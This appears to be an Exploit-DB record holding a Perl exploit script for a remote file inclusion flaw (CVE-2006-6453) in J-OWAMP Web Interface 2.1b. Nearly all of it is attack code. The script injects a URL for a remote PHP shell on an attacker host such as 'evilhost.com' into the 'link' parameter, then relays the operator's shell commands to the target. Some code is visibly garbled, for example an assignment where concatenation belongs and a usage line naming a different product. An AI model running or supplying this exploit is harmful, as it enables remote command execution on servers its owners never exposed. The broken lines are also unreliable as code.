{
  "id": "2895",
  "title": "J-OWAMP Web Interface 2.1b - &#039;link&#039; Remote File Inclusion",
  "cve": "CVE-2006-6453",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n#  Jowamp  WebInterface v 2.1 Remote File Inclusion Vulnerablity\r\n# Vulnerability found & Exploit [c]oded By Dr Max Virus\r\n# Download:http://www.av.it.pt/jowamp/index_files/JOWAMP_WebInterface_version_2_1.zip\r\n# User Must Be Logged In!\r\n# In a web browser open the page http://localhost/jowamp/login/register.php to register new users. \r\n\r\n\r\nuse LWP::UserAgent;\r\n\r\n$target=@ARGV[0];\r\n$shellsite=@ARGV[1];\r\n$cmdv=@ARGV[2];\r\n\r\nif($target!~/http:\\/\\// || $shellsite!~/http:\\/\\// || !$cmdv)\r\n{\r\n       usg()\r\n}\r\nheader();\r\n\r\n\r\nwhile()\r\n{\r\nprint \"[Shell] \\$\";\r\nwhile (<STDIN>)\r\n{\r\n       $cmd=$_;\r\n       chomp($cmd);\r\n\r\n$xpl = LWP::UserAgent->new() or die;\r\n$req =\r\nHTTP::Request->new(GET=>$target.'/JOWAMP_files/JOWAMP_ShowPage.php?link='.$shellsite='.?&'.$cmdv.'='.$cmd)or\r\ndie \"\\n\\n Failed to Connect, Try again!\\n\";\r\n$res = $xpl->request($req);\r\n# The response of the server to the GET request we sent is stored in the\r\n$info variable\r\n$info = $res->content;\r\n$info =~ tr/[\\n]/[&#234;]/;\r\n\r\n\r\nif (!$cmd) {\r\nprint \"\\nEnter a Command\\n\\n\"; $info =\"\";\r\n}\r\n\r\n\r\nelsif ($info =~/failed to open stream: HTTP request failed!/ || $info =~/:\r\nCannot execute a blank command in <b>/)\r\n{\r\nprint \"\\nCould Not Connect to cmd Host or Invalid Command Variable\\n\";\r\nexit;\r\n}\r\n\r\n\r\nelsif ($info =~/^<br.\\/>.<b>Warning/) {\r\nprint \"\\nInvalid Command\\n\\n\";\r\n};\r\n\r\n\r\nif($info =~ /(.+)<br.\\/>.<b>Warning.(.+)<br.\\/>.<b>Warning/)\r\n{\r\n$final = $1;\r\n$final=~ tr/[&#234;]/[\\n]/;\r\nprint \"\\n$final\\n\";\r\nlast;\r\n}\r\n\r\nelse {\r\nprint \"[shell] \\$\";\r\n}\r\n}\r\n}\r\nlast;\r\n\r\n\r\n#Sub-Rountines\r\nsub header()\r\n{\r\nprint q{\r\n********************************************************************************\r\nJowamp WebInterface v2.1  -- Remote Include Exploit\r\n\r\nVulnerablity found by: Dr Max Virus\r\n\r\nExploit [c]oded by: Dr Max Virus\r\n********************************************************************************\r\n}\r\n}\r\nsub usg()\r\n{\r\nheader();\r\nprint q{\r\nUsage: perl exploit.pl <jowamp fullpath> <Shell Location> <Shell Cmd>\r\n\r\n<phorum-3.4.8a FULL PATH> - Path to site exp. www.site.com\r\n\r\n<Shell Location> - Path to shell exp. www.evilhost.com/shell.txt\r\n\r\n<Shell Cmd Variable> - Command variable for php shell\r\n\r\nExample: perl exploit.pl http://www.site.com/jowamp/\r\n**********************************************************************************\r\n};\r\n\r\nexit();\r\n}\r\n\r\n# milw0rm.com [2006-12-07]",
  "url": "https://www.exploit-db.com/exploits/2895"
}